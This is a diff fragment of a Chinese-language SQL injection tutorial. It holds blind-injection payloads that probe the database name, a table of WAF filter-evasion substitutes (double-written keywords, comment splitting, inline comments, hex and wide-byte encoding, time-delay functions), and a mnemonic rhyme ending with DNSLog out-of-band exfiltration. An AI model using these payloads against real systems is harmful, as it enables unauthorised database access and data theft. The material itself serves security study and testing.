+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) > 100
+id=1 AND ASCII(SUBSTRING(DATABASE(),1,1)) < 120
+```
+
+---
+
+#### 0x10.16 绕过技术总结对比表
+
+| 被过滤的对象 | 替代方案 1 | 替代方案 2 | 替代方案 3 | 替代方案 4 | 替代方案 5 |
+|-------------|-----------|-----------|-----------|-----------|-----------|
+| **OR** | `\|\|`（符号） | `OORR`（双写） | `O/**/R`（注释） | `\|`（位运算） | `XOR`（异或） |
+| **AND** | `&&`（符号） | `ANANDD`（双写） | `A/**/ND`（注释） | `&`（位运算） | `NOT !=`（反逻辑） |
+| **空格** | `/**/`（注释） | `()`（括号） | `%09`（Tab） | `%0a`（换行） | `` ` ``（反引号） |
+| **单引号** | `0x...`（十六进制） | `CHAR()` | 双引号 `"` | `UNHEX()` | 宽字节 `%df` |
+| **逗号** | `FROM...FOR` | `OFFSET` | `JOIN` 子查询 | `VALUES ROW` | — |
+| **等号 =** | `LIKE` | `IN` | `BETWEEN..AND` | `>` / `<` | `REGEXP` |
+| **UNION** | `UN/**/ION`（注释） | `UNUNIONION`（双写） | `/*!UNION*/`（内联） | 报错注入替代 | 盲注替代 |
+| **SELECT** | `SEL/**/ECT`（注释） | `SELSELECTECT`（双写） | `/*!SELECT*/`（内联） | 无 UNION 直接绕过 | — |
+| **注释符 ** | `/*!...*/`（内联） | `#`（MySQL） | `--`（标准） | — | — |
+| **SLEEP()** | `BENCHMARK()` | 笛卡尔积拖慢 | `WAITFOR`（MSSQL） | `PG_SLEEP()`（PG） | — |
+| **分号 ;** | `/*!...*/` 绕过 | URL编码`%3b` | — | — | — |
+| **双引号 "** | `%22`（URL编码） | `\"`（转义） | 单引号替代 | `0x22` | — |
+| **WHERE** | `HAVING` | `WHERE/**/`（注释） | `WHWHEREERE`（双写） | — | — |
+
+---
+
+#### 0x10.17 绕过手法速查口诀
+
+```
+检测到 WAF，先看拦什么
+OR 被拦截用 ||，AND 被拦截用 &&
+关键字过滤用双写，单次替换 OORR 行
+空格被拦用注释，括号包裹也很好
+引号被拦用十六进，0x 开头直接上
+逗号被拦 FROM FOR，OFFSET 来救 LIMIT
+多重过滤不要怕，组合技巧轮换上
+宽字节对付转义符，GBK 编码 %df 行
+内联注释 /*!*/，版本控制过 WAF
+带外注入终极招，DNSLog 把数据扛
+
 
 ---
 
